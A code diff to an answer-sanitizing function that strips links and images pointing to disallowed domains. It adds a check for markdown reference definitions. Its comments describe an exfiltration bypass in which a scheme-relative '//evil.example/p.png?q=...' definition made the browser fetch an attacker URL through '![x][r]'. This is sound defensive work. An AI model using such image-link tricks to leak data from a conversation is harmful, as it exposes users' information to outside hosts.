@@ -77,6 +77,9 @@ _MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
 _MD_LINK = re.compile(r"\[([^\]]*)\]\(([^)\s]+)[^)]*\)")
 _HTML_TAG = re.compile(r"<\s*(img|a|iframe|script|link|object|embed)\b[^>]*>", re.I)
 _BARE_URL = re.compile(r"\b(?:https?://|www\.)[^\s<>()\]]+", re.I)
+# A link reference definition ("[r]: //evil.example/x" on a line of its own) gives "[text][r]" and
+# "![x][r]" their target from somewhere else in the answer, so it is checked like an inline link.
+_MD_REF_DEF = re.compile(r"^[ ]{0,3}\[([^\]\n]+)\]:[ \t]*(<[^>\n]*>|\S+)[^\n]*$", re.M)
 
 
 _SCHEME = re.compile(r"([a-z][a-z0-9+.-]*):", re.I)
@@ -124,6 +127,18 @@ def guard_answer(answer: str, allowed_domains: Sequence[str] = ()) -> tuple[str,
         return m.group(1)
 
     out = _MD_LINK.sub(link, out)
+
+    # Before the bare URL pass, which only knows URLs that start with a scheme or "www.": a scheme
+    # relative "//evil.example/p.png?q=..." in a definition passed untouched, and "![x][r]" then
+    # made the browser fetch it. A definition whose target is not allowed goes, and with it every
+    # link and image that refers to it.
+    def ref_def(m: re.Match) -> str:
+        if _allowed(m.group(2).strip("<>"), allowed_domains):
+            return m.group(0)
+        removed.append(m.group(0))
+        return ""
+
+    out = _MD_REF_DEF.sub(ref_def, out)
 
     def bare(m: re.Match) -> str:
         if _allowed(m.group(0), allowed_domains):
